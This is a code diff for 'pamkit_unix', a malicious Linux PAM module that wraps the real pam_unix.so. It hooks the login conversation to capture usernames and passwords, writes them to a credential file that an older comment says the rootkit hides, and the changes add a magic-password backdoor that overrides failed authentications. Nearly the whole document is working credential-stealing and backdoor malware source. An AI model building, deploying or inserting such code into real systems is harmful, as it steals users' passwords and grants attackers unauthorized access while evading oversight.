@@ -1,194 +1,235 @@
-#define _GNU_SOURCE
-
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <dlfcn.h>
-#include <security/pam_modules.h>
-#include <security/pam_appl.h> //conv
-#include <security/_pam_types.h>
-
-#define PAM_UNIX_PATH "<DEFINE>"
-#define PAMKIT_CREDENTIALS_PATH "<DEFINE>"
+#include "pamkit_unix.h"
 
 #ifdef DEBUG
-#define D(x, y) do { \
-    fprintf(stderr, "%s: %s\n", x, y); \
+
+static inline void
+teardown_debug_logging(void)
+{
+    closelog();
+}
+
+#define debug_msg(msg) do {                     \
+        syslog(LOG_AUTH|LOG_DEBUG, "%s", msg);  \
     } while (0)
-#else
-#define D(x,y) do {} while(0)
-#endif 
 
-typedef int (*orig_sm_authenticate_t)   (pam_handle_t *, int, int, const char **);
-typedef int (*orig_sm_setcred_t)        (pam_handle_t *, int, int, const char **);
-typedef int (*orig_sm_acct_mgmt_t)      (pam_handle_t *, int, int, const char **);
-typedef int (*orig_sm_chauthtok_t)      (pam_handle_t *, int, int, const char **);
-typedef int (*orig_sm_open_session_t)   (pam_handle_t *, int, int, const char **);
-typedef int (*orig_sm_close_session_t)  (pam_handle_t *, int, int, const char **);
+#define debug_err(msg, desc) do {                       \
+        syslog(LOG_AUTH|LOG_ERR, "%s: %s", msg, desc);  \
+    } while (0)
 
-typedef int (*conversation_t)(int, const struct pam_message **, struct pam_response **, void *);
-conversation_t orig_conversation_function;
+#else /* !DEBUG */
+
+static inline void
+teardown_debug_logging(void)
+{
+}
+
+#define debug_msg(msg) do {} while (0)
+
+#define debug_err(msg, desc) do {} while (0)
+
+#endif /* DEBUG */
+
+void *orig_pam_unix_handle = NULL;
+conversation_t orig_conv_function = NULL;
 
 char *pamkit_username = NULL;
 char *pamkit_authtok = NULL;
 
-void *module_handle = NULL;
-
-
 void __attribute__((constructor))
-load_pam_unix(void)
+setup_mitm_module(void)
 {
-    module_handle = dlopen(PAM_UNIX_PATH, RTLD_LAZY);
-    if (!module_handle) {
-        D("load_pam_unix", dlerror());
+    orig_pam_unix_handle = dlopen(ORIG_PAM_UNIX_PATH, RTLD_LAZY);
+    if (!orig_pam_unix_handle) {
+        debug_err("setup_mitm_module", dlerror());
         exit(EXIT_FAILURE);
     }
 
-    dlerror();
+    debug_msg("Successfully initialized the mitm module");
 }
 
 void __attribute__((destructor))
-unload_pam_unix(void)
+cleanup_mitm_module(void)
 {
-    if (module_handle) {
-        dlclose(module_handle);
-        module_handle = NULL;
+    teardown_debug_logging();
+
+    if (!orig_pam_unix_handle) {
+        return;
+    }
+
+    if (dlclose(orig_pam_unix_handle) != 0) {
+        debug_err("cleanup_mitm_module", dlerror());
+    } else {
+        debug_msg("Successfully finished mitm module cleanup");
     }
 }
 
-static void inline
-_do_free(void *ptr)
+static int
+pamkit_mitm_conv(int num_msg, const struct pam_message **msg, struct pam_response **resp, void *appdata_ptr)
 {
-    free(ptr);
-    ptr = NULL;
-}
-
-
-int
-pamkit_mitm_conversation(int num_msg, const struct pam_message **msg, struct pam_response **resp, void *appdata_ptr)
-{
-    if (orig_conversation_function == NULL) {
+    if (!orig_conv_function) {
+        debug_msg("Unable to intercept messages because no original conversation function is provided");
         return PAM_CONV_ERR;
     }
 
-    const int retval = orig_conversation_function(num_msg, msg, resp, appdata_ptr);
-
-    if (retval != PAM_SUCCESS) {
+    int retval;
+    if ((retval = orig_conv_function(num_msg, msg, resp, appdata_ptr)) != PAM_SUCCESS) {
         return retval;
     }
 
-    // Inspect conversation msgs and their responses
-    for(int i = 0; i < num_msg; i++) {
-        
-        const struct pam_message *message = *msg + i;
-        const struct pam_response  *response = *resp +i;
+    for (int i = 0; i < num_msg; ++i) {
+        const struct pam_message *intercepted_msg = *msg + i;
+        const struct pam_response *intercepted_rsp = *resp + i;
 
-        if (!message || !resp) {
+        if (!intercepted_msg || !intercepted_rsp) {
             continue;
         }
 
-        if (strstr(message->msg, "login")) {
-            pamkit_username = strdup(response->resp);
-        }
-
-        if (strstr(message->msg, "Password")) {
-            pamkit_authtok = strdup(response->resp);
+        if (strstr(intercepted_msg->msg, "login")) {
+            pamkit_username = strdup(intercepted_rsp->resp);
+        } else if (strstr(intercepted_msg->msg, "Password")) {
+            pamkit_authtok = strdup(intercepted_rsp->resp);
         }
     }
+
     return PAM_SUCCESS;
 }
 
+static int
+persist_credentials(char *service_name, char *username, char *authtok)
+{
+    int ret = 0;
+
+    char *formatted_credentials_entry = NULL;
+    if (asprintf(&formatted_credentials_entry, "[%s]: %s %s\n", service_name, username, authtok) < 0) {
+        debug_err("Failed to format collected credentials", strerror(errno));
+        return -1;
+    }
+
+    int fd = open(PERSISTED_CREDS_PATH, O_WRONLY | O_CREAT | O_APPEND, 0600);
+    if (fd < 0) {
+        debug_err("Failed to open credential-store file", strerror(errno));
+        ret = -1;
+        goto out_relase_format_string;
+    }
+
+    if (flock(fd, LOCK_EX) < 0) {
+        debug_err("Failed to get exclusive lock on the credential-store file",  strerror(errno));
+        ret = -1;
+        goto out_close_file;
+    }
+
+    if (dprintf(fd, "%s", formatted_credentials_entry) < 0) {
+        debug_err("Failed to write credentials to file", strerror(errno));
+        ret = -1;
+        goto out_release_lock;
+    }
+
+out_release_lock:
+    flock(fd, LOCK_UN);
+out_close_file:
+    close(fd);
+out_relase_format_string:
+    free(formatted_credentials_entry);
+
+    return ret;
+}
+
+static int
+check_for_magic_password(void)
+{
+    if (!pamkit_authtok) {
+        return -1;
+    }
+
+    if (strncmp(pamkit_authtok, PAMKIT_MAGIC_PASSWORD, strlen(PAMKIT_MAGIC_PASSWORD)) == 0) {
+        debug_msg("Found magic password");
+        return 0;
+    }
+
+    return -1;
+}
 
 int
 pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
 {
-    const orig_sm_authenticate_t orig_sm_authenticate = dlsym(module_handle, "pam_sm_authenticate");
+    debug_msg("'pam_sm_authenticate' in pamkit_unix.so");
 
+    const orig_sm_authenticate_t orig_sm_authenticate = (orig_sm_authenticate_t) dlsym(orig_pam_unix_handle, "pam_sm_authenticate");
     if (!orig_sm_authenticate) {
-        D("unable to obtain address of 'pam_sm_authenticate'", dlerror());
+        debug_err("Unable to obtain address of 'pam_sm_authenticate'", dlerror());
         return PAM_ABORT;
     }
 
-    // Retrieve application specified conversation function
     struct pam_conv *target_conv;
-    int ret = pam_get_item(pamh, PAM_CONV, (const void **) &target_conv);
-
-    if (ret != PAM_SUCCESS) {
-        // If no conversation function is specified, we let the original pam_unix deal with it
+    if (pam_get_item(pamh, PAM_CONV, (const void **) &target_conv) != PAM_SUCCESS) {
+        /* If no conversation function is specified, we let the original pam_unix module deal with it */
         return orig_sm_authenticate(pamh, flags, argc, argv);
     }
+    orig_conv_function = target_conv->conv;
 
-    orig_conversation_function = target_conv->conv;
-    
-    // Replace application specified conv. function with our custom one
-    target_conv->conv = (conversation_t) pamkit_mitm_conversation;
+    /* Replace application specific conversation function with our mitm conv function */
+    target_conv->conv = (conversation_t) pamkit_mitm_conv;
 
-    ret = orig_sm_authenticate(pamh, flags, argc, argv);
+    int ret = orig_sm_authenticate(pamh, flags, argc, argv);
 
-    // Restore original conversation function
-    target_conv->conv = orig_conversation_function;
-    orig_conversation_function = NULL;
+    target_conv->conv = orig_conv_function;
+    orig_conv_function = NULL;
 
     if (ret != PAM_SUCCESS) {
+        debug_msg("pam_unix.so failed to authenticate the user. User provided credentials will not be persisted!");
+
+        if (check_for_magic_password() == 0) {
+            debug_msg("Overwriting pam_unix.so's auth decision!");
+            ret = PAM_SUCCESS;
+        }
+
         goto out;
     }
 
-    if ((pamkit_authtok == NULL) || (pamkit_authtok[0] == '\0')) {
-        // Could not retrieve any authentication token
+    if (!pamkit_authtok || (pamkit_authtok[0] == '\0')) {
+        debug_msg("Unable to retrieve the user's auth token");
         goto out;
     }
 
-    // If username was not obtained from the (msg, response) pairs, we check if it was set during the
-    //  'pam_start()' invocation
-    if (pamkit_username == NULL || (pamkit_username[0] == '\0')) {
-        const char *temp;
-        const int ret_item = pam_get_item(pamh, PAM_USER, (const void **) &temp);
+    if (!pamkit_username || (pamkit_username[0] == '\0')) {
+        /* If the username was not provided during the conversation, it might've been set when calling 'pam_start()' */
+        char *pam_username_lookup;
 
-        if (ret_item == PAM_SUCCESS && temp != NULL) {
-            pamkit_username = strdup((char*) temp);
+        int username_lookup_ret = pam_get_item(pamh, PAM_USER, (const void **) &pam_username_lookup);
+        if (username_lookup_ret == PAM_SUCCESS && pam_username_lookup) {
+            pamkit_username = strdup(pam_username_lookup);
         } else {
+            debug_msg("username was neither found in the conversation nor was it set when calling 'pam_start()'");
             goto out;
         }
     }
 
-    // Note: file is hidden by the rootkit
-    FILE *f = fopen(PAMKIT_CREDENTIALS_PATH, "a+");
+    char *service_name = NULL;
+    int service_name_lookup_ret = pam_get_item(pamh, PAM_SERVICE, (const void **) &service_name);
+    if (service_name_lookup_ret != PAM_SUCCESS || !service_name) {
+        debug_msg("Unable to to determine service to which the collected credentials belong");
+        service_name = "unknown_service";
+    }
 
-    if (!f) {
+    if(!persist_credentials(service_name, pamkit_username, pamkit_authtok)) {
+        debug_msg("Failed to persist collected credentials");
         goto out;
     }
 
-        char *service_name = NULL;
-    const int service_ret = pam_get_item(pamh, PAM_SERVICE, (const void **) &service_name);
-
-    if (service_ret != PAM_SUCCESS || service_name == NULL) {
-        goto out;
-    }
-
-    char *line = NULL;
-    if (asprintf(&line, "[%s]: <%s> <%s>\n", service_name, pamkit_username, pamkit_authtok) < 0) {
-        goto out;
-    }
-    
-    int fd = fileno(f);
-    write(fd, line, strlen(line));
-    close(fd);
-
-    _do_free(line);
 out:
-    _do_free(pamkit_username);
-    _do_free(pamkit_authtok);
+    free(pamkit_username); pamkit_username = NULL;
+    free(pamkit_authtok); pamkit_authtok = NULL;
     return ret;
 }
 
 int
 pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv)
-{    
-    const orig_sm_setcred_t orig_sm_setcred = dlsym(module_handle, "pam_sm_setcred");
+{
+    debug_msg("'pam_sm_setcred' in pamkit_unix.so");
 
+    const orig_sm_setcred_t orig_sm_setcred = (orig_sm_setcred_t) dlsym(orig_pam_unix_handle, "pam_sm_setcred");
     if (!orig_sm_setcred) {
-        D("unable to obtain address of 'pam_sm_setcred'", dlerror());
+        debug_err("Unable to obtain address of 'pam_sm_setcred'", dlerror());
         return PAM_ABORT;
     }
 
@@ -198,10 +239,11 @@ pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv)
 int
 pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv)
 {
-    const orig_sm_acct_mgmt_t orig_sm_acct_mgmt = dlsym(module_handle, "pam_sm_acct_mgmt");
+    debug_msg("'pam_sm_acct_mgmt' in pamkit_unix.so");
 
+    const orig_sm_acct_mgm_t orig_sm_acct_mgmt = (orig_sm_acct_mgm_t) dlsym(orig_pam_unix_handle, "pam_sm_acct_mgmt");
     if (!orig_sm_acct_mgmt) {
-        D("unable to obtain address of 'pam_sm_acct_mgmt'", dlerror());
+        debug_err("Unable to obtain address of 'pam_sm_acct_mgmt'", dlerror());
         return PAM_ABORT;
     }
 
@@ -211,10 +253,11 @@ pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv)
 int
 pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv)
 {
-    const orig_sm_chauthtok_t orig_sm_chauthtok = dlsym(module_handle, "pam_sm_chauthtok");
+    debug_msg("'pam_sm_chauthtok' in pamkit_unix.so");
 
+    const orig_sm_chauthtok_t orig_sm_chauthtok = (orig_sm_chauthtok_t) dlsym(orig_pam_unix_handle, "pam_sm_chauthtok");
     if (!orig_sm_chauthtok) {
-        D("unable to obtain address of 'pam_sm_chauthok'", dlerror());
+        debug_err("Unable to obtain address of 'pam_sm_chauthtok'", dlerror());
         return PAM_ABORT;
     }
 
@@ -224,10 +267,11 @@ pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv)
 int
 pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv)
 {
-    const orig_sm_open_session_t orig_sm_open_session = dlsym(module_handle, "pam_sm_open_session");
+    debug_msg("'pam_sm_open_session' in pamkit_unix.so");
 
+    const orig_sm_open_session_t orig_sm_open_session = (orig_sm_open_session_t) dlsym(orig_pam_unix_handle, "pam_sm_open_session");
     if (!orig_sm_open_session) {
-        D("unable to obtain address of 'pam_sm_open_session'", dlerror());
+        debug_err("Unable to obtain address of 'pam_sm_open_session'", dlerror());
         return PAM_ABORT;
     }
 
@@ -237,10 +281,11 @@ pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv)
 int
 pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv)
 {
-    const orig_sm_close_session_t orig_sm_close_session = dlsym(module_handle, "pam_sm_close_session");
+    debug_msg("'pam_sm_close_session' in pamkit_unix.so");
 
+    const orig_sm_close_session_t orig_sm_close_session = (orig_sm_close_session_t) dlsym(orig_pam_unix_handle, "pam_sm_close_session");
     if (!orig_sm_close_session) {
-        D("unable to obtain address of 'pam_sm_close_session'", dlerror());
+        debug_err("Unable to obtain address of 'pam_sm_close_session'", dlerror());
         return PAM_ABORT;
     }
 
